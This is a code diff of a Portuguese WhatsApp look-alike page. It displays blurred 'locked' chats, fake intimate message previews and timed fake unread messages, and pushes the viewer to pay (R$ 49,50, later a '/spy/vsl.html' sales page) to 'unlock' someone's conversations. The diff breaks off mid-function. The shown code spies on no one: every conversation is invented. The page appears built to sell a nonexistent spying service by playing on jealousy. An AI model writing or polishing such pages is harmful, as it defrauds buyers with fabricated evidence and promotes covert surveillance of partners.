-    <!-- Botão de desbloquear e manter conexão -->
-    <div class="unlock-connection-button" id="unlockConnectionButton">
-        <a href="https://virtualpagamentos.lovable.app/p/4656f87c-dcc4-4b79-b212-1550fb115ac5" class="unlock-connection-link">
-            <i class="bi bi-wifi"></i> DESBLOQUEAR E MANTER CONEXÃO - R$ 49,50
-        </a>
-    </div>
-    
     <div class="app-container">
         <!-- Tela 1: Lista de Conversas -->
         <div id="conversationsScreen" class="screen active">
             <!-- Header -->
             <div class="whatsapp-header">
                 <div class="header-left">
-                    <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Perfil" class="user-avatar blurred-avatar">
+                    <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Perfil" class="user-avatar blurred-avatar">
                     <div style="min-width: 0;">
-                        <div class="header-title blurred-name">Conversas</div>
-                        <div class="header-subtitle blurred-text">7 conversas bloqueadas</div>
+                        <div class="header-title blurred-name">Conversas
+                            <span class="header-badge" id="totalUnreadCount" style="display: none;">0</span>
+                        </div>
+                        <div class="header-subtitle blurred-text">10 conversas bloqueadas</div>
                     </div>
                 </div>
                 <div class="header-right">
@@ -975,219 +909,35 @@
             </div>
             
             <!-- Lista de conversas -->
-            <div class="conversations-list">
+            <div class="conversations-list" id="conversationsList">
                 <!-- Promoção de pagamento -->
-                <a href="https://virtualpagamentos.lovable.app/p/4656f87c-dcc4-4b79-b212-1550fb115ac5" class="payment-promo pulse-animation" id="promoLink">
-                    <div class="payment-promo-title">🔓 LIBERAR ACESSO COMPLETO</div>
-                    <div class="payment-promo-price">R$ 49,50 </div>
+                <a href="/spy/vsl.html" class="payment-promo" id="promoLink">
+                    <div class="payment-promo-title">DESBLOQUEAR</div>
+                    <div class="payment-promo-price"></div>
                 </a>
                 
                 <!-- Seção: Conversas Bloqueadas -->
-                <div class="section-title">Conversas Bloqueadas</div>
-                
-                <!-- Conversas individuais -->
-                <div class="conversation-item" data-chat="maria">
-                    <div class="conversation-avatar">
-                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
-                        <div class="online-dot"></div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">Maria Silva</span>
-                            </div>
-                            <div class="conversation-time blurred-text">10:30</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conteúdo bloqueado</span>
-                            <span class="locked-badge">🔒</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="conversation-item" data-chat="joao">
-                    <div class="conversation-avatar">
-                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
-                        <div class="online-dot" style="background-color: #8696a0;"></div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">João Santos</span>
-                            </div>
-                            <div class="conversation-time blurred-text">Ontem</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conteúdo bloqueado</span>
-                            <span class="locked-badge">🔒</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="conversation-item" data-chat="ana">
-                    <div class="conversation-avatar">
-                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
-                        <div class="online-dot"></div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">Ana Costa</span>
-                            </div>
-                            <div class="conversation-time blurred-text">Qui</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conteúdo bloqueado</span>
-                            <span class="locked-badge">🔒</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="conversation-item" data-chat="pedro">
-                    <div class="conversation-avatar">
-                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
-                        <div class="online-dot" style="background-color: #8696a0;"></div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">Pedro Alves</span>
-                            </div>
-                            <div class="conversation-time blurred-text">Qua</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conteúdo bloqueado</span>
-                            <span class="locked-badge">🔒</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="conversation-item" data-chat="carla">
-                    <div class="conversation-avatar">
-                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
-                        <div class="online-dot"></div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">Carla Dias</span>
-                            </div>
-                            <div class="conversation-time blurred-text">Ter</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conteúdo bloqueado</span>
-                            <span class="locked-badge">🔒</span>
-                        </div>
-                    </div>
+                <div class="section-title" id="sectionBlocked">Conversas</div>
+                <div id="blockedConversations">
+                    <!-- Conversas individuais serão inseridas aqui -->
                 </div>
                 
                 <!-- Seção: Grupos Bloqueados -->
-                <div class="section-title">Grupos Bloqueados</div>
-                
-                <!-- Grupos -->
-                <div class="conversation-item" data-chat="familia">
-                    <div class="conversation-avatar">
-                        <div class="group-icon blurred-group-icon">
-                            <i class="bi bi-people"></i>
-                        </div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">Família</span>
-                            </div>
-                            <div class="conversation-time blurred-text">10:15</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conteúdo bloqueado</span>
-                            <span class="locked-badge">🔒</span>
-                        </div>
-                    </div>
+                <div class="section-title" id="sectionGroups">Grupos</div>
+                <div id="groupConversations">
+                    <!-- Grupos serão inseridas aqui -->
                 </div>
                 
-                <div class="conversation-item" data-chat="trabalho">
-                    <div class="conversation-avatar">
-                        <div class="group-icon blurred-group-icon">
-                            <i class="bi bi-people"></i>
-                        </div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">Trabalho</span>
-                            </div>
-                            <div class="conversation-time blurred-text">09:45</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conteúdo bloqueado</span>
-                            <span class="locked-badge">🔒</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Conversas adicionais (aparecem depois do pop-up) -->
-                <div class="conversation-item new-conversation" data-chat="novamensagem1" style="display: none;">
-                    <div class="conversation-avatar">
-                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
-                        <div class="online-dot" style="background-color: #8696a0;"></div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">Amiga Secreta</span>
-                            </div>
-                            <div class="conversation-time blurred-text">Agora</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Novo conteúdo íntimo</span>
-                            <span class="locked-badge" style="background-color: #dc2626; color: white;">NOVO</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="conversation-item new-conversation" data-chat="novamensagem2" style="display: none;">
-                    <div class="conversation-avatar">
-                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
-                        <div class="online-dot"></div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">Colega do Trabalho</span>
-                            </div>
-                            <div class="conversation-time blurred-text">Agora</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Mensagem íntima</span>
-                            <span class="locked-badge" style="background-color: #dc2626; color: white;">NOVO</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="conversation-item new-conversation" data-chat="novamensagem3" style="display: none;">
-                    <div class="conversation-avatar">
-                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
-                        <div class="online-dot" style="background-color: #8696a0;"></div>
-                    </div>
-                    <div class="conversation-details">
-                        <div class="conversation-name-row">
-                            <div class="conversation-name">
-                                <span class="blurred-name">Ex-namorado(a)</span>
-                            </div>
-                            <div class="conversation-time blurred-text">Agora</div>
-                        </div>
-                        <div class="conversation-preview">
-                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conteúdo sensível</span>
-                            <span class="locked-badge" style="background-color: #dc2626; color: white;">NOVO</span>
-                        </div>
-                    </div>
+                <!-- Conversas adicionais -->
+                <div id="newConversations">
+                    <!-- Novas conversas serão inseridas aqui -->
                 </div>
             </div>
             
             <!-- Botão de desbloqueio fixo no rodapé -->
             <div class="unlock-button-container">
-                <a href="https://virtualpagamentos.lovable.app/p/4656f87c-dcc4-4b79-b212-1550fb115ac5" class="unlock-all-button pulse-animation" id="unlockAllButton">
-                    <i class="bi bi-unlock-fill"></i> DESBLOQUEAR TODAS AS CONVERSAS - R$ 49,50 
+                <a href="/spy/vsl.html" class="unlock-all-button" id="unlockAllButton">
+                    <i class="bi bi-unlock-fill"></i> DESBLOQUEAR TODAS AS CONVERSAS 
                 </a>
             </div>
         </div>
@@ -1195,19 +945,19 @@
         <!-- Tela 2: Visualização do Chat -->
         <div id="chatScreen" class="screen hidden">
             <!-- Header do Chat -->
-            <div class="whatsapp-header">
+            <div class="whatsapp-header chat-header">
                 <div class="header-left">
                     <button class="back-button" id="backButton">
                         <i class="bi bi-arrow-left"></i>
                     </button>
                     <div class="conversation-avatar">
-                        <img id="chatAvatar" src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="user-avatar blurred-avatar">
+                        <img id="chatAvatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="Contato" class="user-avatar blurred-avatar">
                         <div id="chatOnlineDot" class="online-dot"></div>
                     </div>
                     <div style="min-width: 0;">
                         <div class="header-title">
-                            <span id="chatName" class="blurred-name">Maria Silva</span>
-                            <span class="locked-badge">🔒</span>
+                            <span id="chatName" class="blurred-name">Contato</span>
+                            <span class="locked-badge"></span>
                         </div>
                         <div class="header-subtitle blurred-text" id="chatStatus">Online • Horário bloqueado</div>
                     </div>
@@ -1225,7 +975,7 @@
                     <!-- Mensagens serão inseridas aqui via JavaScript -->
                 </div>
                 
-                <!-- Overlay de bloqueio -->
+                <!-- Overlay de bloqueio light -->
                 <div class="chat-blocked-overlay">
                     <div class="blocked-content">
                         <div class="blocked-icon">
@@ -1246,117 +996,131 @@
     </div>
 
     <script>
-        // Dados das conversas
+        // Dados completos das conversas
         const chatData = {
             maria: {
                 name: "Maria Silva",
-                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                 online: true,
+                section: "blocked",
+                gender: "women",
+                avatarId: 44,
                 messages: [
-                    { type: "incoming", time: "10:15", content: "Oi, tudo bem? Faz tempo que não nos falamos!" },
-                    { type: "outgoing", time: "10:16", content: "Tudo sim! E com você? O que tem feito?" },
-                    { type: "incoming", time: "10:17", content: "Estou bem também! Tenho algo importante para te contar..." },
-                    { type: "incoming", time: "10:18", content: "É sobre aquela noite especial que passamos juntos 😊" },
-                    { type: "outgoing", time: "10:20", content: "Ah sim, lembro bem... Foi realmente especial 💖" },
-                    { type: "incoming", time: "10:22", content: "Queria reviver esses momentos com você..." },
-                    { type: "outgoing", time: "10:25", content: "Eu também! Quando podemos nos encontrar?" }
+                    { type: "incoming", time: "10:15", content: "" },
+                    { type: "outgoing", time: "10:16", content: "" },
+                    { type: "incoming", time: "10:17", content: "" },
+                    { type: "incoming", time: "10:18", content: "" },
+                    { type: "outgoing", time: "10:20", content: "" }
                 ]
             },
             joao: {
                 name: "João Santos",
-                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                 online: false,
+                section: "blocked",
+                gender: "men",
+                avatarId: 32,
                 messages: [
-                    { type: "outgoing", time: "14:30", content: "Oi João, como você está?" },
-                    { type: "incoming", time: "14:35", content: "Estou bem! Precisava conversar com você sobre algo importante" },
-                    { type: "outgoing", time: "14:40", content: "Claro, pode falar" },
-                    { type: "incoming", time: "14:45", content: "É sobre aquela conversa que tivemos naquela noite..." }
+                    { type: "outgoing", time: "14:30", content: "" },
+                    { type: "incoming", time: "14:35", content: "" },
+                    { type: "outgoing", time: "14:40", content: "" },
+                    { type: "incoming", time: "14:45", content: "" }
                 ]
             },
             ana: {
                 name: "Ana Costa",
-                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                 online: true,
+                section: "blocked",
+                gender: "women",
+                avatarId: 22,
                 messages: [
-                    { type: "incoming", time: "09:10", content: "Bom dia! Lembra do nosso encontro?" },
-                    { type: "outgoing", time: "09:15", content: "Claro que lembro! Foi inesquecível" },
-                    { type: "incoming", time: "09:20", content: "Estou pensando muito naquela noite..." }
+                    { type: "incoming", time: "09:10", content: "" },
+                    { type: "outgoing", time: "09:15", content: "" },
+                    { type: "incoming", time: "09:20", content: "" }
                 ]
             },
             pedro: {
                 name: "Pedro Alves",
-                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                 online: false,
+                section: "blocked",
+                gender: "men",
+                avatarId: 11,
                 messages: [
-                    { type: "outgoing", time: "20:45", content: "Pedro, precisamos conversar" },
-                    { type: "incoming", time: "21:00", content: "Sobre o quê?" },
-                    { type: "outgoing", time: "21:05", content: "Sobre o que aconteceu entre nós..." }
+                    { type: "outgoing", time: "20:45", content: "" },
+                    { type: "incoming", time: "21:00", content: "" },
+                    { type: "outgoing", time: "21:05", content: "" }
                 ]
             },
             carla: {
                 name: "Carla Dias",
-                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                 online: true,
+                section: "blocked",
+                gender: "women",
+                avatarId: 33,
                 messages: [
-                    { type: "incoming", time: "11:30", content: "Oi! Tudo bem com você?" },
-                    { type: "outgoing", time: "11:35", content: "Tudo! E com você?" },
-                    { type: "incoming", time: "11:40", content: "Estou bem! Senti sua falta..." }
+                    { type: "incoming", time: "11:30", content: "" },
+                    { type: "outgoing", time: "11:35", content: "" },
+                    { type: "incoming", time: "11:40", content: "" }
                 ]
             },
             familia: {
                 name: "Família",
-                avatar: "",
                 online: true,
                 isGroup: true,
+                section: "groups",
                 messages: [
-                    { type: "incoming", time: "19:00", content: "Mãe: Alguém viu as fotos da festa?" },
-                    { type: "incoming", time: "19:05", content: "Irmão: Vi sim! Lembra daquela foto nossa?" },
-                    { type: "incoming", time: "19:10", content: "Pai: Essa foi uma noite especial para todos" }
+                    { type: "incoming", time: "19:00", content: "" },
+                    { type: "incoming", time: "19:05", content: "" },
+                    { type: "incoming", time: "19:10", content: "" }
                 ]
             },
             trabalho: {
                 name: "Trabalho",
-                avatar: "",
                 online: false,
                 isGroup: true,
+                section: "groups",
                 messages: [
-                    { type: "incoming", time: "15:20", content: "Chefe: Reunião importante amanhã" },
-                    { type: "incoming", time: "15:25", content: "Colega 1: Alguém preparou o relatório?" },
-                    { type: "outgoing", time: "15:30", content: "Eu: Sim, já terminei" }
+                    { type: "incoming", time: "15:20", content: "" },
+                    { type: "incoming", time: "15:25", content: "" },
+                    { type: "outgoing", time: "15:30", content: "" }
                 ]
             },
-            novamensagem1: {
+            amigosecreta: {
                 name: "Amiga Secreta",
-                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                 online: false,
+                section: "new",
+                gender: "women",
+                avatarId: 55,
                 messages: [
-                    { type: "incoming", time: "11:45", content: "Oi, encontrei algumas mensagens antigas nossas..." },
-                    { type: "incoming", time: "11:46", content: "São bem íntimas, você se lembra?" },
-                    { type: "outgoing", time: "11:50", content: "Claro que lembro! Aquela noite foi especial" }
+                    { type: "incoming", time: "11:45", content: "" },
+                    { type: "incoming", time: "11:46", content: "" },
+                    { type: "outgoing", time: "11:50", content: "" }
                 ]
             },
-            novamensagem2: {
+            colegatrabalho: {
                 name: "Colega do Trabalho",
-                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                 online: true,
+                section: "new",
+                gender: "women",
+                avatarId: 28,
                 messages: [
-                    { type: "outgoing", time: "12:30", content: "Lembrei de você hoje..." },
-                    { type: "incoming", time: "12:35", content: "Sério? Do que exatamente?" },
-                    { type: "outgoing", time: "12:40", content: "Daquela conversa íntima que tivemos" }
+                    { type: "outgoing", time: "12:30", content: "" },
+                    { type: "incoming", time: "12:35", content: "" },
+                    { type: "outgoing", time: "12:40", content: "" }
                 ]
             },
-            novamensagem3: {
+            exnamorado: {
                 name: "Ex-namorado(a)",
-                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                 online: false,
+                section: "new",
+                gender: "men",
+                avatarId: 19,
                 messages: [
-                    { type: "incoming", time: "13:15", content: "Acabei de ver nossas mensagens antigas" },
-                    { type: "incoming", time: "13:20", content: "São bem sensíveis, não deveriam estar bloqueadas?" },
-                    { type: "outgoing", time: "13:25", content: "Verdade, são muito pessoais" }
+                    { type: "incoming", time: "13:15", content: "" },
+                    { type: "incoming", time: "13:20", content: "" },
+                    { type: "outgoing", time: "13:25", content: "" }
                 ]
             }
         };
-        
+
         // Elementos DOM
         const conversationsScreen = document.getElementById('conversationsScreen');
         const chatScreen = document.getElementById('chatScreen');
@@ -1368,370 +1132,353 @@
         const chatMessages = document.getElementById('chatMessages');
         const unlockAllButton = document.getElementById('unlockAllButton');
         const promoLink = document.getElementById('promoLink');
-        const popupNotification = document.getElementById('popupNotification');
-        const popupClose = document.getElementById('popupClose');
-        const connectionTimer = document.getElementById('connectionTimer');
-        const timerCountdown = document.getElementById('timerCountdown');
-        const unlockConnectionButton = document.getElementById('unlockConnectionButton');
-        
-        // Variáveis de controle do timer
-        let timeLeft = 300; // 5 minutos em segundos (300)
-        let timerInterval = null;
-        let timerStarted = false;
-        let connectionButtonShown = false;
-        let removeButtonTimeout = null;
-        
-        // Variáveis gerais
-        let popupShown = false;
-        let newConversationsAdded = false;
-        
+        const conversationsList = document.getElementById('conversationsList');
+        const blockedConversations = document.getElementById('blockedConversations');
+        const groupConversations = document.getElementById('groupConversations');
+        const newConversations = document.getElementById('newConversations');
+        const totalUnreadCount = document.getElementById('totalUnreadCount');
+
+        // Variáveis de controle
+        let currentChatId = null;
+        let unreadMessagesCount = {};
+        let conversationItems = {};
+        let messageIntervals = {};
+        let newMessagesSystemActive = false;
+
+        // Lista de mensagens simuladas
+        const messageTemplates = [
+            "Estou pensando em você agora mesmo...",
+            "Lembra daquela noite especial?",
+            "Queria sentir seu toque agora",
+            "Tenho fotos nossas daquela vez",
+            "Precisamos conversar sobre o que aconteceu",
+            "Estou com muita saudade",
+            "Você está sozinho(a) agora?",
+            "Posso te ligar para conversarmos?",
+            "Tenho algo muito pessoal para te mostrar",
+            "São nossas mensagens íntimas",
+            "Fotos sensíveis que você enviou",
+            "Conteúdo especial só para você",
+            "Algo muito pessoal que preciso contar",
+            "Confidencial: nossas conversas",
+            "Vídeos que você me enviou aquela vez",
+            "Estou revendo nossas mensagens antigas",
+            "Quero reviver aqueles momentos",
+            "Lembra do que fizemos juntos?",
+            "Tenho desejo de você agora",
+            "São mensagens nossas"
+        ];
+
         // Inicialização
         document.addEventListener('DOMContentLoaded', function() {
-            // Adicionar event listeners
-            setupEventListeners();
+            document.body.style.opacity = '0';
+            document.body.style.transition = 'opacity 0.5s ease';
             
-            // Mostrar pop-up após 3 segundos
-            setTimeout(showPopupNotification, 3000);
-            
-            // Atualizar contador de conversas bloqueadas
-            updateBlockedConversationsCount();
-            
-            // Iniciar timer após 10 segundos
-            setTimeout(startConnectionTimer, 10000);
-            
-            // Iniciar simulação de mensagens chegando após 15 segundos
-            setTimeout(startMessageSimulation, 15000);
+            setTimeout(() => {
+                document.body.style.opacity = '1';
+                initializeConversations();
+                setupEventListeners();
+                startMessagesSystem();
+            }, 300);
         });
-        
-        // Configurar todos os event listeners
-        function setupEventListeners() {
-            // Clique nas conversas
-            document.querySelectorAll('.conversation-item').forEach(item => {
-                item.addEventListener('click', function(e) {
-                    // Prevenir clique duplo acidental
-                    if (e.detail > 1) return;
-                    
-                    selectConversation(this);
-                    openChat(this.dataset.chat);
-                });
+
+        // Inicializar conversas
+        function initializeConversations() {
+            // Limpar contêineres
+            blockedConversations.innerHTML = '';
+            groupConversations.innerHTML = '';
+            newConversations.innerHTML = '';
+            
+            // Inicializar contador de mensagens não lidas
+            Object.keys(chatData).forEach(chatId => {
+                unreadMessagesCount[chatId] = 0;
             });
             
-            // Botão voltar
-            backButton.addEventListener('click', goBackToConversations);
-            
-            // Botão de desbloquear tudo
-            unlockAllButton.addEventListener('click', function(e) {
-                resetTimer(); // Resetar timer ao clicar no botão
-            });
-            
-            // Link da promoção
-            promoLink.addEventListener('click', function(e) {
-                resetTimer(); // Resetar timer ao clicar no botão
-            });
-            
-            // Botão de desbloquear e manter conexão
-            unlockConnectionButton.querySelector('a').addEventListener('click', function(e) {
-                resetTimer(); // Resetar timer ao clicar no botão
-            });
-            
-            // Fechar pop-up
-            popupClose.addEventListener('click', closePopupNotification);
-            
-            // Fechar pop-up automaticamente após 8 segundos
-            popupNotification.addEventListener('animationend', function() {
-                if (popupNotification.classList.contains('show')) {
-                    setTimeout(closePopupNotification, 8000);
+            // Adicionar conversas bloqueadas
+            Object.keys(chatData).forEach(chatId => {
+                const chat = chatData[chatId];
+                if (chat.section === 'blocked') {
+                    addConversationToSection(chatId, chat, blockedConversations);
+                } else if (chat.section === 'groups') {
+                    addConversationToSection(chatId, chat, groupConversations);
+                } else if (chat.section === 'new') {
+                    addConversationToSection(chatId, chat, newConversations);
                 }
             });
             
-            // Prevenir comportamentos padrão indesejados
+            updateTotalUnreadCount();
+        }
+
+        // Adicionar conversa à seção
+        function addConversationToSection(chatId, chat, container, hidden = false) {
+            const conversationItem = document.createElement('div');
+            conversationItem.className = 'conversation-item';
+            conversationItem.dataset.chat = chatId;
+            conversationItem.dataset.section = chat.section;
+            
+            const isGroup = chat.isGroup || false;
+            const lastMessageTime = chat.messages.length > 0 ? chat.messages[chat.messages.length - 1].time : '00:00';
+            
+            // Gerar avatar aleatório
+            let avatarUrl = '';
+            if (isGroup) {
+                avatarUrl = '';
+            } else {
+                const gender = chat.gender || (Math.random() > 0.5 ? 'men' : 'women');
+                const randomId = chat.avatarId || Math.floor(Math.random() * 99) + 1;
+                avatarUrl = `https://randomuser.me/api/portraits/${gender}/${randomId}.jpg`;
+            }
+            
+            conversationItem.innerHTML = `
+                <div class="conversation-avatar">
+                    ${isGroup ? 
+                        `<div class="group-icon blurred-group-icon">
+                            <i class="bi bi-people"></i>
+                        </div>` : 
+                        `<img src="${avatarUrl}" alt="Contato" class="avatar-img blurred-avatar-img">
+                         <div class="online-dot" style="background-color: ${chat.online ? '#31a24c' : '#667781'};"></div>`
+                    }
+                </div>
+                <div class="conversation-details">
+                    <div class="conversation-name-row">
+                        <div class="conversation-name">
+                            <span class="blurred-name">${chat.name}</span>
+                        </div>
+                        <div class="conversation-time blurred-text" id="time-${chatId}">${lastMessageTime}</div>
+                    </div>
+                    <div class="conversation-preview">
+                        <span class="blurred-text" id="preview-${chatId}" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conteúdo bloqueado</span>
+                        <span class="locked-badge">🔒</span>
+                        <div class="unread-badge" id="badge-${chatId}" style="display: none;">0</div>
+                    </div>
+                </div>
+            `;
+            
+            container.appendChild(conversationItem);
+            conversationItems[chatId] = conversationItem;
+        }
+
+        // Configurar event listeners
+        function setupEventListeners() {
+            // Clique nas conversas com efeito ripple
+            document.addEventListener('click', function(e) {
+                const conversationItem = e.target.closest('.conversation-item');
+                if (conversationItem) {
+                    if (e.detail > 1) return;
+                    
+                    createRippleEffect(e, conversationItem);
+                    
+                    setTimeout(() => {
+                        selectConversation(conversationItem);
+                        openChat(conversationItem.dataset.chat);
+                    }, 200);
+                }
+            });
+            
+            // Botão voltar
+            backButton.addEventListener('click', function(e) {
+                createRippleEffect(e, backButton);
+                goBackToConversations();
+            });
+            
+            // Botões de desbloqueio
+            unlockAllButton.addEventListener('click', function(e) {
+                createRippleEffect(e, this);
+            });
+            
+            promoLink.addEventListener('click', function(e) {
+                createRippleEffect(e, this);
+            });
+            
+            // Prevenir cliques em links vazios
             document.querySelectorAll('a[href="#"]').forEach(el => {
                 el.addEventListener('click', function(e) {
                     e.preventDefault();
                 });
             });
             
-            // Melhorar toque para mobile
+            // Otimização para mobile
             document.addEventListener('touchstart', function() {}, {passive: true});
         }
-        
-        // Iniciar simulação de mensagens chegando
-        function startMessageSimulation() {
-            // Lista de conversas para simular mensagens
-            const conversations = ['maria', 'joao', 'ana', 'carla', 'familia'];
+
+        // Efeito ripple para toques
+        function createRippleEffect(event, element) {
+            const ripple = document.createElement('span');
+            const rect = element.getBoundingClientRect();
+            const size = Math.max(rect.width, rect.height);
+            const x = event.clientX - rect.left - size / 2;
+            const y = event.clientY - rect.top - size / 2;
             
-            conversations.forEach((chatId, index) => {
-                // Delay diferente para cada conversa
-                setTimeout(() => {
-                    simulateIncomingMessage(chatId);
-                }, index * 8000); // 8 segundos entre cada conversa
+            ripple.style.cssText = `
+                position: absolute;
+                border-radius: 50%;
+                background: rgba(0, 0, 0, 0.1);
+                transform: scale(0);
+                animation: rippleEffect 0.6s linear;
+                pointer-events: none;
+                width: ${size}px;
+                height: ${size}px;
+                left: ${x}px;
+                top: ${y}px;
+                z-index: 1;
+            `;
+            
+            element.style.position = 'relative';
+            element.style.overflow = 'hidden';
+            element.appendChild(ripple);
+            
+            setTimeout(() => {
+                ripple.remove();
+            }, 600);
+        }
+
+        // Iniciar sistema de mensagens
+        function startMessagesSystem() {
+            if (newMessagesSystemActive) return;
+            newMessagesSystemActive = true;
+            
+            // Definir quais contatos recebem mensagens rápidas (apenas 2)
+            const quickContacts = ['maria', 'joao']; // Apenas Maria e João recebem mensagens rápidas
+            
+            // Para cada conversa
+            Object.keys(conversationItems).forEach((chatId, index) => {
+                if (quickContacts.includes(chatId)) {
+                    // Contatos rápidos: 2 mensagens rápidas
+                    const firstDelay = Math.floor(Math.random() * 2000) + 2000;
+                    
+                    setTimeout(() => {
+                        addNewMessageToChat(chatId);
+                        
+                        // Segunda mensagem rápida: 2-3 segundos após a primeira
+                        const secondDelay = Math.floor(Math.random() * 1000) + 2000;
+                        
+                        setTimeout(() => {
+                            addNewMessageToChat(chatId);
+                            
+                            // Configurar intervalo longo para mensagens subsequentes: 45-90 segundos
+                            startMessageIntervalForChat(chatId);
+                        }, secondDelay);
+                    }, firstDelay + (index * 1000));
+                } else {
+                    // Outros contatos: apenas intervalo longo (sem mensagens rápidas)
+                    const initialDelay = Math.floor(Math.random() * 10000) + 10000; // 10-20 segundos para começar
+                    
+                    setTimeout(() => {
+                        // Começar com uma mensagem
+                        addNewMessageToChat(chatId);
+                        
+                        // Configurar intervalo longo
+                        startMessageIntervalForChat(chatId);
+                    }, initialDelay + (index * 1000));
+                }
             });
-            
-            // Simular digitação em algumas conversas
-            setTimeout(() => {
-                simulateTyping('maria');
-            }, 12000);
-            
-            setTimeout(() => {
-                simulateTyping('ana');
-            }, 20000);
         }
-        
-        // Simular mensagem chegando
-        function simulateIncomingMessage(chatId) {
-            const conversationItem = document.querySelector(`.conversation-item[data-chat="${chatId}"]`);
-            if (!conversationItem) return;
+
+        // Iniciar intervalo de mensagens para uma conversa
+        function startMessageIntervalForChat(chatId) {
+            // Limpar intervalo anterior se existir
+            if (messageIntervals[chatId]) {
+                clearInterval(messageIntervals[chatId]);
+            }
             
-            const previewElement = conversationItem.querySelector('.conversation-preview');
-            const timeElement = conversationItem.querySelector('.conversation-time');
+            // Criar intervalo longo: entre 45 e 90 segundos
+            const intervalTime = Math.floor(Math.random() * 45000) + 45000;
             
-            if (!previewElement || !timeElement) return;
+            messageIntervals[chatId] = setInterval(() => {
+                addNewMessageToChat(chatId);
+            }, intervalTime);
+        }
+
+        // Adicionar nova mensagem à conversa
+        function addNewMessageToChat(chatId) {
+            if (!conversationItems[chatId]) return;
             
-            // Salvar o estado original
-            const originalPreview = previewElement.innerHTML;
-            const originalTime = timeElement.textContent;
+            // Incrementar contador de mensagens não lidas
+            unreadMessagesCount[chatId] = (unreadMessagesCount[chatId] || 0) + 1;
             
-            // Atualizar para mostrar nova mensagem
-            timeElement.textContent = 'Agora';
-            timeElement.classList.remove('blurred-text');
-            timeElement.style.color = '#25d366';
+            // Selecionar mensagem aleatória
+            const randomMessage = messageTemplates[Math.floor(Math.random() * messageTemplates.length)];
             
-            previewElement.innerHTML = `
-                <span style="color: #25d366; flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">
-                    Nova mensagem 🔔
-                </span>
-                <span class="locked-badge" style="background-color: #dc2626; color: white;">NOVO</span>
-            `;
+            // Atualizar preview da mensagem
+            const previewElement = document.getElementById(`preview-${chatId}`);
+            if (previewElement) {
